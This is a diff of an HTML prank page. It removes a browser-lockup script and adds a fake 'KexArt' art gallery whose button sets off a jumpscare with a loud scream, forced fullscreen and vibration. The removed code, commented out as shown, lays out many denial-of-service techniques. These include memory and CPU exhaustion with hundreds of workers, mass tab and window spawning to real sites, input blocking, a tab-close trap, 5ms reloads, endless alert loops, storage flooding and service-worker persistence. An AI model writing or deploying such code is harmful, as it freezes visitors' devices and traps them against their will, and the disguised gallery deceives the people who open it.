@@ -1,687 +1,533 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta http-equiv="refresh" content="0; url=index.html">
-    <title>⚠️ SYSTEM OVERLOAD ⚠️</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>KexArt - Digital Art Gallery</title>
+
+    <!-- ===== STYLES ===== -->
     <style>
-        /* ========== STYLE SECTION ========== */
-        /* Line 1   */ * { margin:0; padding:0; }
-        /* Line 2   */ body {
-        /* Line 3   */     background: #0a0a0a;
-        /* Line 4   */     color: #ff0040;
-        /* Line 5   */     font: 900 6rem 'Courier New', monospace;
-        /* Line 6   */     overflow: hidden;
-        /* Line 7   */     height: 100vh;
-        /* Line 8   */     display: flex;
-        /* Line 9   */     align-items: center;
-        /* Line 10  */     justify-content: center;
-        /* Line 11  */     flex-direction: column;
-        /* Line 12  */     user-select: none;
-        /* Line 13  */     cursor: none;
-        /* Line 14  */ }
-        /* Line 15  */ @keyframes glitch {
-        /* Line 16  */     0% { opacity:1; transform: scale(1) rotate(0deg); }
-        /* Line 17  */     25% { opacity:0.3; transform: scale(1.5) rotate(5deg); }
-        /* Line 18  */     50% { opacity:0.8; transform: scale(0.8) rotate(-5deg); }
-        /* Line 19  */     75% { opacity:0.1; transform: scale(1.8) rotate(10deg); }
-        /* Line 20  */     100% { opacity:1; transform: scale(1) rotate(0deg); }
-        /* Line 21  */ }
-        /* Line 22  */ .glitch {
-        /* Line 23  */     animation: glitch 0.02s infinite;
-        /* Line 24  */     text-shadow: 0 0 80px red, 0 0 160px magenta;
-        /* Line 25  */ }
-        /* Line 26  */ .sub {
-        /* Line 27  */     font-size: 1.2rem;
-        /* Line 28  */     color: #666;
-        /* Line 29  */     margin-top: 20px;
-        /* Line 30  */ }
-        /* Line 31  */ audio { display: none; }
-        /* Line 32  */ canvas { display: none; }
-        /* Line 33  */ iframe { display: none; }
-        /* Line 34  */ /* End of style section */
-        /* Line 35  */
+        /* ----- Reset & Base ----- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0a0a0f;
+            color: #e0e0e0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 2rem;
+            background-image:
+                radial-gradient(ellipse at 20% 50%, rgba(88, 40, 120, 0.15) 0%, transparent 60%),
+                radial-gradient(ellipse at 80% 50%, rgba(40, 80, 180, 0.10) 0%, transparent 60%);
+        }
+
+        /* ----- Main Container ----- */
+        .gallery-container {
+            max-width: 1100px;
+            width: 100%;
+            background: rgba(20, 20, 30, 0.85);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border-radius: 32px;
+            padding: 3rem 2.5rem;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.8), inset 0 1px 0 rgba(255, 255, 255, 0.03);
+            transition: all 0.4s ease;
+        }
+
+        /* ----- Header ----- */
+        .gallery-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 2.5rem;
+            flex-wrap: wrap;
+            gap: 1rem;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .logo-icon {
+            width: 48px;
+            height: 48px;
+            background: linear-gradient(135deg, #a855f7, #6366f1);
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            font-weight: 700;
+            color: #fff;
+            box-shadow: 0 8px 24px rgba(99, 102, 241, 0.3);
+        }
+
+        .logo h1 {
+            font-size: 1.8rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #c084fc, #818cf8);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: -0.5px;
+        }
+
+        .logo span {
+            font-size: 0.85rem;
+            color: #8888aa;
+            -webkit-text-fill-color: #8888aa;
+            font-weight: 400;
+        }
+
+        .header-badge {
+            background: rgba(168, 85, 247, 0.15);
+            border: 1px solid rgba(168, 85, 247, 0.2);
+            padding: 0.4rem 1.2rem;
+            border-radius: 100px;
+            font-size: 0.8rem;
+            color: #c084fc;
+            letter-spacing: 0.3px;
+        }
+
+        /* ----- Gallery Grid ----- */
+        .gallery-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1.5rem;
+            margin: 2rem 0 2.5rem 0;
+        }
+
+        .art-card {
+            aspect-ratio: 1 / 1;
+            border-radius: 18px;
+            background: linear-gradient(145deg, #1a1a2e, #16162a);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+            padding: 1.5rem;
+            text-align: center;
+        }
+
+        .art-card:hover {
+            transform: translateY(-4px);
+            border-color: rgba(168, 85, 247, 0.25);
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.4);
+        }
+
+        .art-card .emoji {
+            font-size: 3.5rem;
+            margin-bottom: 0.6rem;
+            filter: grayscale(0.2);
+        }
+
+        .art-card .title {
+            font-size: 0.85rem;
+            font-weight: 500;
+            color: #ccccee;
+        }
+
+        .art-card .sub {
+            font-size: 0.7rem;
+            color: #666688;
+            margin-top: 0.2rem;
+        }
+
+        .art-card .glow {
+            position: absolute;
+            inset: 0;
+            background: radial-gradient(circle at 30% 40%, rgba(168, 85, 247, 0.06), transparent 70%);
+            pointer-events: none;
+        }
+
+        /* ----- Featured Section ----- */
+        .featured-section {
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 20px;
+            padding: 2rem 2rem 1.8rem 2rem;
+            margin: 1rem 0 2rem 0;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 1.5rem;
+        }
+
+        .featured-text h3 {
+            font-size: 1.2rem;
+            font-weight: 600;
+            color: #f0f0ff;
+        }
+
+        .featured-text p {
+            font-size: 0.9rem;
+            color: #8888aa;
+            margin-top: 0.2rem;
+        }
+
+        /* ===== THE TRIGGER BUTTON ===== */
+        .explore-btn {
+            background: linear-gradient(135deg, #a855f7, #6366f1);
+            border: none;
+            padding: 1rem 2.8rem;
+            border-radius: 60px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: #fff;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 32px rgba(99, 102, 241, 0.25);
+            letter-spacing: 0.3px;
+            position: relative;
+            overflow: hidden;
+            white-space: nowrap;
+        }
+
+        .explore-btn:hover {
+            transform: scale(1.04);
+            box-shadow: 0 12px 48px rgba(99, 102, 241, 0.4);
+        }
+
+        .explore-btn:active {
+            transform: scale(0.96);
+        }
+
+        .explore-btn .arrow {
+            display: inline-block;
+            margin-left: 8px;
+            transition: transform 0.3s ease;
+        }
+
+        .explore-btn:hover .arrow {
+            transform: translateX(6px);
+        }
+
+        /* ----- Footer ----- */
+        .gallery-footer {
+            margin-top: 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 0.8rem;
+            color: #555577;
+            border-top: 1px solid rgba(255, 255, 255, 0.04);
+            padding-top: 1.5rem;
+            flex-wrap: wrap;
+            gap: 0.5rem;
+        }
+
+        .gallery-footer a {
+            color: #777799;
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+
+        .gallery-footer a:hover {
+            color: #a855f7;
+        }
+
+        /* ===== JUMBSCREEN OVERLAY ===== */
+        #jumpscare-overlay {
+            position: fixed;
+            inset: 0;
+            width: 100vw;
+            height: 100vh;
+            background: #000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 99999;
+            flex-direction: column;
+            cursor: none;
+            animation: flashBang 0.08s ease 3;
+        }
+
+        #jumpscare-overlay.active {
+            display: flex;
+        }
+
+        @keyframes flashBang {
+            0%   { background: #fff; }
+            50%  { background: #000; }
+            100% { background: #000; }
+        }
+
+        #jumpscare-overlay .face {
+            font-size: 20rem;
+            line-height: 1;
+            animation: shake 0.05s infinite alternate;
+            user-select: none;
+            filter: drop-shadow(0 0 80px rgba(255, 0, 0, 0.6));
+        }
+
+        @keyframes shake {
+            0%   { transform: translate(-12px, 8px) scale(1.05); }
+            25%  { transform: translate(10px, -6px) scale(0.95); }
+            50%  { transform: translate(-8px, 12px) scale(1.08); }
+            75%  { transform: translate(14px, -10px) scale(0.92); }
+            100% { transform: translate(-6px, 6px) scale(1.02); }
+        }
+
+        #jumpscare-overlay .sub-text {
+            color: #ff2244;
+            font-size: 2rem;
+            font-weight: 700;
+            margin-top: 1rem;
+            text-shadow: 0 0 40px rgba(255, 0, 0, 0.5);
+            animation: blinkText 0.15s infinite alternate;
+            font-family: 'Courier New', monospace;
+        }
+
+        @keyframes blinkText {
+            0%   { opacity: 1; }
+            50%  { opacity: 0.2; }
+            100% { opacity: 1; }
+        }
+
+        #jumpscare-overlay .close-hint {
+            position: absolute;
+            bottom: 3rem;
+            color: rgba(255, 255, 255, 0.15);
+            font-size: 0.8rem;
+            font-family: monospace;
+            letter-spacing: 2px;
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 700px) {
+            .gallery-container {
+                padding: 1.8rem 1.2rem;
+            }
+            .logo h1 {
+                font-size: 1.3rem;
+            }
+            .gallery-grid {
+                grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+                gap: 1rem;
+            }
+            .art-card .emoji {
+                font-size: 2.6rem;
+            }
+            .featured-section {
+                flex-direction: column;
+                text-align: center;
+                padding: 1.5rem;
+            }
+            .explore-btn {
+                width: 100%;
+                justify-content: center;
+                padding: 0.9rem 1.5rem;
+                font-size: 1rem;
+                white-space: normal;
+            }
+            #jumpscare-overlay .face {
+                font-size: 10rem;
+            }
+            #jumpscare-overlay .sub-text {
+                font-size: 1.2rem;
+            }
+        }
+
+        @media (max-width: 450px) {
+            .gallery-grid {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 0.8rem;
+            }
+            .art-card {
+                padding: 1rem;
+            }
+            .art-card .emoji {
+                font-size: 2rem;
+            }
+            .art-card .title {
+                font-size: 0.7rem;
+            }
+        }
     </style>
 </head>
+
 <body>
-    <!-- ========== HTML STRUCTURE ========== -->
-    <!-- Line 36  --><div class="glitch">☢️ CRITICAL FAILURE ☢️</div>
-    <!-- Line 37  --><div class="sub">Your system is now under our control.</div>
 
-    <!-- ========== AUDIO ELEMENTS ========== -->
-    <!-- Line 38  --><audio id="a1" loop><source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg"></audio>
-    <!-- Line 39  --><audio id="a2" loop><source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-2.mp3" type="audio/mpeg"></audio>
-    <!-- Line 40  --><audio id="a3" loop><source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-3.mp3" type="audio/mpeg"></audio>
-    <!-- Line 41  --><audio id="a4" loop><source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg"></audio>
-    <!-- Line 42  --><audio id="a5" loop><source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-2.mp3" type="audio/mpeg"></audio>
-    <!-- Line 43  --><audio id="a6" loop><source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-3.mp3" type="audio/mpeg"></audio>
-    <!-- Line 44  -->
+    <!-- ===== MAIN GALLERY UI ===== -->
+    <div class="gallery-container">
 
-    <!-- ========== MEGA SCRIPT ========== -->
+        <!-- Header -->
+        <div class="gallery-header">
+            <div class="logo">
+                <div class="logo-icon">✦</div>
+                <div>
+                    <h1>KexArt <span>gallery</span></h1>
+                </div>
+            </div>
+            <div class="header-badge">✦ curated collection</div>
+        </div>
+
+        <!-- Gallery Grid -->
+        <div class="gallery-grid">
+            <div class="art-card">
+                <div class="glow"></div>
+                <div class="emoji">🎨</div>
+                <div class="title">Digital Dreams</div>
+                <div class="sub">by Luna V.</div>
+            </div>
+            <div class="art-card">
+                <div class="glow"></div>
+                <div class="emoji">🌌</div>
+                <div class="title">Nebula Nocturne</div>
+                <div class="sub">by Orion K.</div>
+            </div>
+            <div class="art-card">
+                <div class="glow"></div>
+                <div class="emoji">🌀</div>
+                <div class="title">Infinite Loop</div>
+                <div class="sub">by S. Chen</div>
+            </div>
+            <div class="art-card">
+                <div class="glow"></div>
+                <div class="emoji">🔥</div>
+                <div class="title">Phoenix Rise</div>
+                <div class="sub">by M. Rivera</div>
+            </div>
+        </div>
+
+        <!-- Featured + CTA -->
+        <div class="featured-section">
+            <div class="featured-text">
+                <h3>✨ Featured Exhibition</h3>
+                <p>12 new artists • immersive digital works</p>
+            </div>
+            <!-- THE TRIGGER -->
+            <button class="explore-btn" id="exploreBtn">
+                Explore Gallery <span class="arrow">→</span>
+            </button>
+        </div>
+
+        <!-- Footer -->
+        <div class="gallery-footer">
+            <span>© 2026 KexArt · digital art collective</span>
+            <span>
+                <a href="#">about</a> · <a href="#">artists</a> · <a href="#">exhibitions</a>
+            </span>
+        </div>
+    </div>
+
+    <!-- ===== JUMBSCARE OVERLAY ===== -->
+    <div id="jumpscare-overlay">
+        <div class="face">👹</div>
+        <div class="sub-text">⚠️ YOU'VE BEEN PRANKED ⚠️</div>
+        <div class="close-hint">[ click anywhere to exit ]</div>
+    </div>
+
+    <!-- ===== JAVASCRIPT ===== -->
     <script>
-        // =====================================================================
-        //  SECTION 1: PERSISTENCE & COUNTERS
-        // =====================================================================
-        // Line 45  (function() {
-        // Line 46      // Check if this is the first run
-        // Line 47      if (!localStorage.getItem('mega_brutal')) {
-        // Line 48          localStorage.setItem('mega_brutal', 'active');
-        // Line 49          // Reload immediately to double the effect
-        // Line 50          location.reload();
-        // Line 51      } else {
-        // Line 52          // Increase the spawn counter
-        // Line 53          let count = parseInt(localStorage.getItem('mega_count') || '0');
-        // Line 54          localStorage.setItem('mega_count', count + 1);
-        // Line 55          // If this is the 5th+ run, go nuclear
-        // Line 56          if (count > 4) {
-        // Line 57              for (let i = 0; i < 500; i++) window.open(location.href, '_blank');
-        // Line 58          }
-        // Line 59      }
-        // Line 60
+        (function() {
+            'use strict';
 
-        // =====================================================================
-        //  SECTION 2: MASSIVE MEMORY ALLOCATION (50MB+ payload)
-        // =====================================================================
-        // Line 61      function allocateHugePayload() {
-        // Line 62          const size = 50 * 1024 * 1024; // 50 MB
-        // Line 63          let str = '';
-        // Line 64          while (str.length < size) {
-        // Line 65              str += 'a'.repeat(1024 * 1024) + Math.random().toString(36);
-        // Line 66          }
-        // Line 67          window._huge = str; // global reference to prevent GC
-        // Line 68          console.log('Allocated ' + (str.length / 1024 / 1024).toFixed(2) + ' MB');
-        // Line 69      }
-        // Line 70      allocateHugePayload();
+            // ----- DOM refs -----
+            const overlay = document.getElementById('jumpscare-overlay');
+            const triggerBtn = document.getElementById('exploreBtn');
 
-        // =====================================================================
-        //  SECTION 3: LARGE ARRAY LEAKS (RAM filling)
-        // =====================================================================
-        // Line 71      window._leak = [];
-        // Line 72      function fillMemory() {
-        // Line 73          for (let i = 0; i < 300; i++) {
-        // Line 74              const arr = new Array(10_000_000).fill('x'.repeat(1000));
-        // Line 75              window._leak.push(arr);
-        // Line 76              // Also store in localStorage to persist
-        // Line 77              try {
-        // Line 78                  localStorage.setItem('mem_' + i, 'x'.repeat(1024 * 1024));
-        // Line 79              } catch(e) {}
-        // Line 80          }
-        // Line 81      }
-        // Line 82      fillMemory();
+            // ----- Audio (loud scream / jumpscare sound) -----
+            // Using a public sound effect URL – you can replace with your own.
+            const screamAudio = new Audio(
+                'https://www.myinstants.com/media/sounds/scream-sound-effect.mp3'
+            );
+            screamAudio.volume = 1.0;
+            screamAudio.preload = 'auto';
 
-        // =====================================================================
-        //  SECTION 4: MULTIPLE WEB WORKERS FOR CPU BURN
-        // =====================================================================
-        // Line 83      function spawnWorkers() {
-        // Line 84          const workerCode = `
-        // Line 85              setInterval(() => {
-        // Line 86                  for (let i = 0; i < 100000000; i++) Math.sqrt(i);
-        // Line 87              }, 1);
-        // Line 88              // Also allocate memory inside worker
-        // Line 89              let big = [];
-        // Line 90              setInterval(() => {
-        // Line 91                  big.push(new Array(1000000).fill(Math.random()));
-        // Line 92              }, 10);
-        // Line 93          `;
-        // Line 94          const blob = new Blob([workerCode], {type: 'application/javascript'});
-        // Line 95          const url = URL.createObjectURL(blob);
-        // Line 96          window._workers = window._workers || [];
-        // Line 97          for (let i = 0; i < 200; i++) {
-        // Line 98              const w = new Worker(url);
-        // Line 99              window._workers.push(w);
-        // Line 100         }
-        // Line 101     }
-        // Line 102     spawnWorkers();
+            // Backup: if the main sound fails, try an alternative.
+            const screamFallback = new Audio(
+                'https://www.myinstants.com/media/sounds/vine-boom.mp3'
+            );
+            screamFallback.volume = 1.0;
 
-        // =====================================================================
-        //  SECTION 5: AUDIO ASSAULT (300+ simultaneous tracks)
-        // =====================================================================
-        // Line 103     function audioAssault() {
-        // Line 104         const urls = [
-        // Line 105             'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3',
-        // Line 106             'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-2.mp3',
-        // Line 107             'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-3.mp3'
-        // Line 108         ];
-        // Line 109         for (let i = 0; i < 300; i++) {
-        // Line 110             const a = new Audio(urls[i % urls.length]);
-        // Line 111             a.volume = 1.0;
-        // Line 112             a.loop = true;
-        // Line 113             a.play().catch(() => {});
-        // Line 114             // Store to prevent GC
-        // Line 115             if (!window._audios) window._audios = [];
-        // Line 116             window._audios.push(a);
-        // Line 117         }
-        // Line 118         // Also play the embedded ones
-        // Line 119         document.querySelectorAll('audio').forEach(a => a.play().catch(()=>{}));
-        // Line 120     }
-        // Line 121     audioAssault();
+            // ----- Function: trigger the jumpscare -----
+            function triggerJumpscare() {
+                // 1. Show overlay
+                overlay.classList.add('active');
 
-        // =====================================================================
-        //  SECTION 6: FULLSCREEN + POINTER LOCK + WAKE LOCK
-        // =====================================================================
-        // Line 122     function lockScreen() {
-        // Line 123         if (!document.fullscreenElement) {
-        // Line 124             document.documentElement.requestFullscreen?.().catch(()=>{});
-        // Line 125             document.documentElement.webkitRequestFullscreen?.();
-        // Line 126         }
-        // Line 127         if (!document.pointerLockElement) {
-        // Line 128             document.body.requestPointerLock?.().catch(()=>{});
-        // Line 129         }
-        // Line 130         if (navigator.wakeLock) {
-        // Line 131             navigator.wakeLock.request('screen').catch(()=>{});
-        // Line 132         }
-        // Line 133     }
-        // Line 134     setInterval(lockScreen, 10);
-        // Line 135     lockScreen();
-        // Line 136     document.addEventListener('visibilitychange', lockScreen);
-        // Line 137     window.addEventListener('focus', lockScreen);
+                // 2. Play loud sound
+                screamAudio.play().catch(function() {
+                    // If main sound fails, try fallback
+                    screamFallback.play().catch(function() {
+                        // Silent fallback – at least the visual works
+                        console.log('Audio blocked by browser – visual jumpscare only.');
+                    });
+                });
 
-        // =====================================================================
-        //  SECTION 7: KEYBOARD & MOUSE BLOCK
-        // =====================================================================
-        // Line 138     document.addEventListener('keydown', (e) => {
-        // Line 139         e.preventDefault();
-        // Line 140         e.stopPropagation();
-        // Line 141     }, true);
-        // Line 142     document.addEventListener('keyup', (e) => {
-        // Line 143         e.preventDefault();
-        // Line 144     }, true);
-        // Line 145     document.addEventListener('contextmenu', (e) => e.preventDefault());
-        // Line 146     // Disable right-click, copy, paste, etc.
-        // Line 147     document.addEventListener('selectstart', (e) => e.preventDefault());
-        // Line 148     document.addEventListener('dragstart', (e) => e.preventDefault());
+                // 3. Force fullscreen (if not already)
+                if (document.documentElement.requestFullscreen) {
+                    document.documentElement.requestFullscreen().catch(function() {
+                        // User may block fullscreen – that's okay
+                    });
+                }
 
-        // =====================================================================
-        //  SECTION 8: BEFOREUNLOAD TRAP (prevents tab close)
-        // =====================================================================
-        // Line 149     window.addEventListener('beforeunload', (e) => {
-        // Line 150         e.preventDefault();
-        // Line 151         e.returnValue = '';
-        // Line 152         for (let i = 0; i < 500; i++) window.open(location.href, '_blank');
-        // Line 153         location.reload();
-        // Line 154     });
+                // 4. Vibrate on mobile
+                if (navigator.vibrate) {
+                    navigator.vibrate([200, 100, 200, 100, 400]);
+                }
 
-        // =====================================================================
-        //  SECTION 9: INFINITE HISTORY SPAM
-        // =====================================================================
-        // Line 155     history.pushState(null, null, location.href);
-        // Line 156     window.addEventListener('popstate', () => {
-        // Line 157         history.pushState(null, null, location.href);
-        // Line 158         for (let i = 0; i < 100; i++) window.open(location.href, '_blank');
-        // Line 159     });
-        // Line 160     setInterval(() => {
-        // Line 161         history.pushState(null, null, location.href);
-        // Line 162     }, 5);
+                // 5. Disable scroll on body
+                document.body.style.overflow = 'hidden';
+            }
 
-        // =====================================================================
-        //  SECTION 10: TAB STORM – REAL WEBSITES
-        // =====================================================================
-        // Line 163     const targetSites = [
-        // Line 164         'https://www.instagram.com',
-        // Line 165         'https://www.facebook.com',
-        // Line 166         'https://www.youtube.com',
-        // Line 167         'https://www.twitter.com',
-        // Line 168         'https://www.reddit.com',
-        // Line 169         'https://www.tiktok.com',
-        // Line 170         'https://www.snapchat.com',
-        // Line 171         'https://www.pinterest.com',
-        // Line 172         'https://www.linkedin.com',
-        // Line 173         'https://www.whatsapp.com',
-        // Line 174         'https://www.discord.com',
-        // Line 175         'https://www.twitch.tv',
-        // Line 176         'https://www.spotify.com',
-        // Line 177         'https://www.netflix.com',
-        // Line 178         'https://www.amazon.com',
-        // Line 179         'https://www.google.com',
-        // Line 180         'https://www.yahoo.com',
-        // Line 181         'https://www.bing.com',
-        // Line 182         'https://www.wikipedia.org'
-        // Line 183     ];
-        // Line 184     function spawnTabs() {
-        // Line 185         for (let i = 0; i < 80; i++) {
-        // Line 186             const url = targetSites[Math.floor(Math.random() * targetSites.length)];
-        // Line 187             const name = 'tab_' + Date.now() + '_' + i + '_' + Math.random();
-        // Line 188             const win = window.open(url, name, 'width=800,height=600');
-        // Line 189             if (!win) {
-        // Line 190                 const a = document.createElement('a');
-        // Line 191                 a.href = url;
-        // Line 192                 a.target = name;
-        // Line 193                 a.click();
-        // Line 194             }
-        // Line 195         }
-        // Line 196     }
-        // Line 197     setInterval(spawnTabs, 100);
-        // Line 198     spawnTabs();
+            // ----- Function: dismiss jumpscare -----
+            function dismissJumpscare() {
+                overlay.classList.remove('active');
+                document.body.style.overflow = '';
 
-        // =====================================================================
-        //  SECTION 11: AUTO-RELOAD (every 5ms)
-        // =====================================================================
-        // Line 199     setInterval(() => {
-        // Line 200         location.reload(true);
-        // Line 201     }, 5);
+                // Exit fullscreen if active
+                if (document.fullscreenElement) {
+                    document.exitFullscreen().catch(function() {});
+                }
+            }
 
-        // =====================================================================
-        //  SECTION 12: ALERT / PROMPT / CONFIRM STORM
-        // =====================================================================
-        // Line 202     setTimeout(() => {
-        // Line 203         while (true) {
-        // Line 204             alert('⚠️ SYSTEM HIJACKED ⚠️');
-        // Line 205             prompt('Enter password to unlock:');
-        // Line 206             confirm('Are you sure you want to escape?');
-        // Line 207         }
-        // Line 208     }, 200);
+            // ----- Event: trigger on button click -----
+            triggerBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                triggerJumpscare();
+            });
 
-        // =====================================================================
-        //  SECTION 13: ADDITIONAL INFINITE LOOPS (CPU)
-        // =====================================================================
-        // Line 209     function freezeCPU() {
-        // Line 210         let i = 0;
-        // Line 211         while (true) {
-        // Line 212             i++;
-        // Line 213             if (i % 100000 === 0) {
-        // Line 214                 // Allocate more memory
-        // Line 215                 const arr = new Array(1000000).fill('x'.repeat(1000));
-        // Line 216                 window._leak.push(arr);
-        // Line 217             }
-        // Line 218         }
-        // Line 219     }
-        // Line 220     setTimeout(freezeCPU, 150);
+            // ----- Event: dismiss on overlay click -----
+            overlay.addEventListener('click', function(e) {
+                // Only dismiss if the overlay itself is clicked (not child elements)
+                // but we want any click on the overlay to dismiss.
+                dismissJumpscare();
+            });
 
-        // =====================================================================
-        //  SECTION 14: VIBRATION (mobile)
-        // =====================================================================
-        // Line 221     if (navigator.vibrate) {
-        // Line 222         setInterval(() => navigator.vibrate(3000), 100);
-        // Line 223     }
+            // ----- Event: dismiss with Escape key -----
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Escape' && overlay.classList.contains('active')) {
+                    dismissJumpscare();
+                }
+            });
 
-        // =====================================================================
-        //  SECTION 15: BROADCAST CHANNEL (sync across tabs)
-        // =====================================================================
-        // Line 224     try {
-        // Line 225         const bc = new BroadcastChannel('mega_brutal');
-        // Line 226         bc.onmessage = (e) => {
-        // Line 227             if (e.data === 'spawn') {
-        // Line 228                 spawnTabs();
-        // Line 229                 spawnTabs();
-        // Line 230             }
-        // Line 231         };
-        // Line 232         // Broadcast every 50ms
-        // Line 233         setInterval(() => {
-        // Line 234             bc.postMessage('spawn');
-        // Line 235         }, 50);
-        // Line 236     } catch(e) {}
+            // ----- Prevent accidental dismissal via touch on mobile -----
+            // (Already handled by click event)
 
-        // =====================================================================
-        //  SECTION 16: IFRAME SPAM (extra payload)
-        // =====================================================================
-        // Line 237     function spawnIframes() {
-        // Line 238         for (let i = 0; i < 100; i++) {
-        // Line 239             const iframe = document.createElement('iframe');
-        // Line 240             iframe.src = 'https://www.google.com';
-        // Line 241             iframe.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
-        // Line 242             document.body.appendChild(iframe);
-        // Line 243         }
-        // Line 244     }
-        // Line 245     spawnIframes();
-        // Line 246     setInterval(spawnIframes, 200);
+            // ----- (Optional) Auto-trigger after 3 seconds for testing -----
+            // Uncomment the line below to auto-trigger on page load:
+            // setTimeout(triggerJumpscare, 3000);
 
-        // =====================================================================
-        //  SECTION 17: LOCALSTORAGE FLOOD
-        // =====================================================================
-        // Line 247     function floodStorage() {
-        // Line 248         let data = 'x'.repeat(1024 * 1024);
-        // Line 249         for (let i = 0; i < 500; i++) {
-        // Line 250             try {
-        // Line 251                 localStorage.setItem('flood_' + i, data + Math.random());
-        // Line 252             } catch(e) {}
-        // Line 253         }
-        // Line 254     }
-        // Line 255     floodStorage();
-        // Line 256     setInterval(floodStorage, 100);
-
-        // =====================================================================
-        //  SECTION 18: DOM ELEMENT SPAM (thousands of elements)
-        // =====================================================================
-        // Line 257     function spamDOM() {
-        // Line 258         for (let i = 0; i < 2000; i++) {
-        // Line 259             const div = document.createElement('div');
-        // Line 260             div.style.cssText = `
-        // Line 261                 position:absolute;
-        // Line 262                 left:${Math.random() * 100}%;
-        // Line 263                 top:${Math.random() * 100}%;
-        // Line 264                 width:${Math.random() * 100}px;
-        // Line 265                 height:${Math.random() * 100}px;
-        // Line 266                 background:rgb(${Math.random()*255},0,${Math.random()*255});
-        // Line 267                 border-radius:50%;
-        // Line 268                 opacity:${Math.random() * 0.5};
-        // Line 269                 pointer-events:none;
-        // Line 270             `;
-        // Line 271             document.body.appendChild(div);
-        // Line 272         }
-        // Line 273     }
-        // Line 274     spamDOM();
-        // Line 275     setInterval(spamDOM, 50);
-
-        // =====================================================================
-        //  SECTION 19: WINDOW RESIZE & MOVE (disorientation)
-        // =====================================================================
-        // Line 276     setInterval(() => {
-        // Line 277         window.resizeTo(100 + Math.random() * 800, 100 + Math.random() * 600);
-        // Line 278         window.moveTo(Math.random() * screen.width, Math.random() * screen.height);
-        // Line 279     }, 20);
-
-        // =====================================================================
-        //  SECTION 20: FOCUS THEFT
-        // =====================================================================
-        // Line 280     setInterval(() => {
-        // Line 281         window.focus();
-        // Line 282         // Also try to bring to front by opening a blank window and closing it
-        // Line 283         const w = window.open('', '_blank');
-        // Line 284         if (w) { w.close(); }
-        // Line 285     }, 10);
-
-        // =====================================================================
-        //  SECTION 21: CONSOLE SPAM
-        // =====================================================================
-        // Line 286     setInterval(() => {
-        // Line 287         console.log('%c☢️ BRUTAL MODE ACTIVE ☢️', 'font-size:40px;color:red;');
-        // Line 288         console.error('Critical error: memory exhausted');
-        // Line 289         console.warn('System unstable');
-        // Line 290     }, 5);
-
-        // =====================================================================
-        //  SECTION 22: SELF-DESTRUCT (optional – but we keep it)
-        // =====================================================================
-        // Line 291     // Not destroying; we want to keep going
-
-        // =====================================================================
-        //  SECTION 23: SERVICE WORKER (for persistence after restart)
-        // =====================================================================
-        // Line 292     if ('serviceWorker' in navigator) {
-        // Line 293         const swCode = `
-        // Line 294             self.addEventListener('install', e => e.waitUntil(skipWaiting()));
-        // Line 295             self.addEventListener('activate', e => e.waitUntil(clients.claim()));
-        // Line 296             self.addEventListener('fetch', e => {
-        // Line 297                 e.respondWith(fetch(e.request).catch(() => new Response('', {status:200})));
-        // Line 298             });
-        // Line 299         `;
-        // Line 300         const blob = new Blob([swCode], {type: 'application/javascript'});
-        // Line 301         const swUrl = URL.createObjectURL(blob);
-        // Line 302         navigator.serviceWorker.register(swUrl).then(() => {
-        // Line 303             if (!localStorage.getItem('sw_registered')) {
-        // Line 304                 localStorage.setItem('sw_registered', 'true');
-        // Line 305                 location.reload();
-        // Line 306             }
-        // Line 307         }).catch(()=>{});
-        // Line 308     }
-
-        // =====================================================================
-        //  SECTION 24: EXTRA – REPEATED WINDOW.OPEN WITH DIFFERENT STRATEGIES
-        // =====================================================================
-        // Line 309     function openMoreWindows() {
-        // Line 310         for (let i = 0; i < 30; i++) {
-        // Line 311             // Use a random target to avoid being blocked as duplicate
-        // Line 312             const target = '_blank_' + Math.random().toString(36).substring(2);
-        // Line 313             window.open(location.href, target);
-        // Line 314         }
-        // Line 315     }
